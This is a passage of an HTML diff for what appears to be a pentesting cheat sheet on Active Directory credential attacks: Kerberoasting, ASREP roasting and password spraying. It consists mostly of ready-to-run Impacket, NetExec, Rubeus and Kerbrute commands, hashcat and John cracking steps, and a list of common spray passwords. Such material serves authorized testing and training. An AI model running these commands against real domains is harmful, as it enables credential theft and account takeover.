+<li><a href="https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html">HackTricks - DPAPI Extracting Passwords</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast">The Hacker Recipes - Kerberoast</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/asreproast">The Hacker Recipes - ASREProast</a></li>
+<li><a href="https://www.netexec.wiki/">NetExec Documentation</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
+<li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
+<li><a href="https://github.com/skelsec/pypykatz">pypykatz</a></li>
+<li><a href="https://wadcoms.github.io/">WADComs</a></li>
+</ul>
+<hr />
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>Kerberoasting targets domain user accounts that have Service Principal Names.</p>
+<p>When a domain user requests a service ticket for an SPN, part of the returned ticket is encrypted with key material derived from the service account password. If the SPN belongs to a user account, the ticket can often be cracked offline.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Valid domain account</td>
+<td>Usually any low-privileged domain user.</td>
+</tr>
+<tr>
+<td>Reachable KDC</td>
+<td>Usually a domain controller on port <code>88</code>.</td>
+</tr>
+<tr>
+<td>SPN on user account</td>
+<td>Target service account must have SPN.</td>
+</tr>
+<tr>
+<td>Cracking wordlist</td>
+<td>Offline cracking after ticket collection.</td>
+</tr>
+</tbody>
+</table>
+<p>Good targets usually have:</p>
+<ul>
+<li>SPN set on a user account</li>
+<li>old password</li>
+<li>weak password policy</li>
+<li>privileged group membership</li>
+<li>service-like name</li>
+<li>description suggesting service usage</li>
+</ul>
+<p><strong>Find SPN users with LDAP</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sAMAccountName<span class="w"> </span>servicePrincipalName<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet<span class="w"> </span>lastLogonTimestamp
+</span></code></pre></div>
+<p><strong>Find SPN users with PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">memberof</span>
+</span></code></pre></div>
+<p><strong>Request TGS hashes with Impacket</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request
+</span></code></pre></div>
+<p>Save to file:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>Kerberos mode:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-k<span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p><strong>Request with NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--kerberoasting<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--kerberoasting<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p><strong>Request with Rubeus</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span>
+</span></code></pre></div>
+<p>Write hashes to file:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">kerberoast_hashes</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p>Target one user:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_sql</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">svc_sql_tgs</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p>RC4-only style request:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">rc4opsec</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">kerberoast_rc4</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p><strong>Cracking</strong></p>
+<p>Common Hashcat modes:</p>
+<table>
+<thead>
+<tr>
+<th>Hash type</th>
+<th>Mode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberos 5 TGS-REP etype 23</td>
+<td><code>13100</code></td>
+</tr>
+<tr>
+<td>Kerberos 5 TGS-REP etype 17</td>
+<td><code>19600</code></td>
+</tr>
+<tr>
+<td>Kerberos 5 TGS-REP etype 18</td>
+<td><code>19700</code></td>
+</tr>
+</tbody>
+</table>
+<p>Hashcat:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p>Rules:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-r<span class="w"> </span>rules/best64.rule
+</span></code></pre></div>
+<p>Show cracked:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>--show
+</span></code></pre></div>
+<p>John:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>kerberoast_hashes.txt
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>john<span class="w"> </span>--show<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p><strong>Result interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hash collected</td>
+<td>TGS was requested and saved.</td>
+</tr>
+<tr>
+<td>Crack succeeds</td>
+<td>Plaintext password recovered.</td>
+</tr>
+<tr>
+<td>Crack fails</td>
+<td>Password may be strong or unsupported by current wordlist.</td>
+</tr>
+<tr>
+<td>AES hash</td>
+<td>Usually harder than RC4.</td>
+</tr>
+<tr>
+<td>Privileged service account</td>
+<td>Higher-value credential.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="asrep-roasting">ASREP Roasting</h2>
+<p>ASREP roasting targets users that do not require Kerberos pre-authentication.</p>
+<p>If pre-authentication is disabled, the KDC can return AS-REP material that includes data encrypted with the user's password-derived key. This material can be cracked offline.</p>
+<p>ASREP roasting can be performed without credentials if a username list is available.</p>
+<p>It can also be performed with credentials by first finding users with the <code>DONT_REQ_PREAUTH</code> flag.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain name</td>
+<td>Example: <code>corp.local</code>.</td>
+</tr>
+<tr>
+<td>DC IP</td>
+<td>KDC target.</td>
+</tr>
+<tr>
+<td>Username list</td>
+<td>For unauthenticated check.</td>
+</tr>
+<tr>
+<td>Kerberos reachable</td>
+<td>Port <code>88</code>.</td>
+</tr>
+<tr>
+<td>Account with pre-auth disabled</td>
+<td>Target condition.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Unauthenticated ASREP check</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass
+</span></code></pre></div>
+<p>Save hashes:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p><strong>Authenticated discovery with LDAP</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet
+</span></code></pre></div>
+<p><strong>Authenticated ASREP with Impacket</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p><strong>NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--asreproast<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">DONT_REQ_PREAUTH</span>
+</span></code></pre></div>
+<p><strong>Rubeus</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span>
+</span></code></pre></div>
+<p>Output to file:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">asrep_hashes</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p><strong>Cracking</strong></p>
+<p>Hashcat mode:</p>
+<table>
+<thead>
+<tr>
+<th>Hash type</th>
+<th>Mode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberos 5 AS-REP etype 23</td>
+<td><code>18200</code></td>
+</tr>
+</tbody>
+</table>
+<p>Hashcat:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p>Show cracked:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>--show
+</span></code></pre></div>
+<p>John:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>asrep_hashes.txt
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>john<span class="w"> </span>--show<span class="w"> </span>asrep_hashes.txt
+</span></code></pre></div>
+<p><strong>Result interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AS-REP hash returned</td>
+<td>Account likely does not require pre-auth.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code></td>
+<td>User likely does not exist.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_PREAUTH_REQUIRED</code></td>
+<td>User exists but pre-auth is required.</td>
+</tr>
+<tr>
+<td>Crack succeeds</td>
+<td>Plaintext password recovered.</td>
+</tr>
+<tr>
+<td>Crack fails</td>
+<td>Strong password or weak cracking strategy.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="password-spraying">Password Spraying</h2>
+<p>Password spraying tests one or a small number of passwords against many users.</p>
+<p>It is different from brute force.</p>
+<p>Brute force usually tests many passwords against one user. Password spraying tests one password across many users to reduce lockout risk.</p>
+<p>Password spraying should only be performed when explicitly allowed and after checking the password policy.</p>
+<p><strong>Before spraying</strong></p>
+<p>Collect:</p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Valid users</td>
+<td>Reduces noise and failed attempts.</td>
+</tr>
+<tr>
+<td>Lockout threshold</td>
+<td>Number of bad attempts before lockout.</td>
+</tr>
+<tr>
+<td>Observation window</td>
+<td>Time window for counting failures.</td>
+</tr>
+<tr>
+<td>Lockout duration</td>
+<td>How long lockout lasts.</td>
+</tr>
+<tr>
+<td>Fine-grained password policy</td>
+<td>Different users may have different lockout settings.</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Which users and systems are allowed.</td>
+</tr>
+<tr>
+<td>Timing</td>
+<td>Avoid business impact in real assessments.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Get password policy</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--pass-pol
+</span></code></pre></div>
+<p>LDAP/domain policy:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--pass-pol
+</span></code></pre></div>
+<p>RPC:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;getdompwinfo&quot;</span>
+</span></code></pre></div>
+<p>PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">net</span> <span class="n">accounts</span> <span class="p">/</span><span class="n">domain</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nb">Get-ADDefaultDomainPasswordPolicy</span>
+</span></code></pre></div>
+<p><strong>Prepare users</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>cat<span class="w"> </span>users.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;[:upper:]&#39;</span><span class="w"> </span><span class="s1">&#39;[:lower:]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>users_clean.txt
+</span></code></pre></div>
+<p>Remove machine accounts:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;\$$&#39;</span><span class="w"> </span>users_clean.txt<span class="w"> </span>&gt;<span class="w"> </span>users_no_machines.txt
+</span></code></pre></div>
+<p><strong>SMB spray with NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>users_no_machines.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>--continue-on-success
+</span></code></pre></div>
+<p>With domain:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>users_no_machines.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
+</span></code></pre></div>
+<p>Against a host list:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>targets.txt<span class="w"> </span>-u<span class="w"> </span>users_no_machines.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
+</span></code></pre></div>
+<p><strong>LDAP spray with NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>users_no_machines.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
+</span></code></pre></div>
+<p><strong>Kerberos spray with Kerbrute</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>users_no_machines.txt<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span>
+</span></code></pre></div>
+<p>Save output:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>users_no_machines.txt<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>-o<span class="w"> </span>spray_password123.txt
+</span></code></pre></div>
+<p><strong>Username-as-password spray</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>users_no_machines.txt<span class="w"> </span>-p<span class="w"> </span>users_no_machines.txt<span class="w"> </span>--no-bruteforce<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
+</span></code></pre></div>
+<p>This tests:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>alice:alice
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>bob:bob
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>charlie:charlie
+</span></code></pre></div>
+<p><strong>Candidate passwords</strong></p>
+<p>Common lab-style candidates:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Password123!
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>Welcome1!
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>Welcome123!
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>Summer2025!
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>Winter2026!
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>Company2025!
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>Corp2025!
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>ChangeMe123!
+</span></code></pre></div>
+<p>Build custom candidates from context:</p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Company name</td>
+<td><code>Corp2026!</code></td>
+</tr>
+<tr>
+<td>Season/year</td>
+<td><code>Summer2026!</code></td>
+</tr>
+<tr>
+<td>Product name</td>
+<td><code>Product2026!</code></td>
+</tr>
+<tr>
+<td>Domain name</td>
+<td><code>Corp.local2026!</code></td>
+</tr>
+<tr>
+<td>Internal file hints</td>
+<td>Passwords found in scripts or docs.</td>
+</tr>
+<tr>
+<td>Naming convention</td>
+<td><code>Welcome_&lt;site&gt;</code></td>
+</tr>
+</tbody>
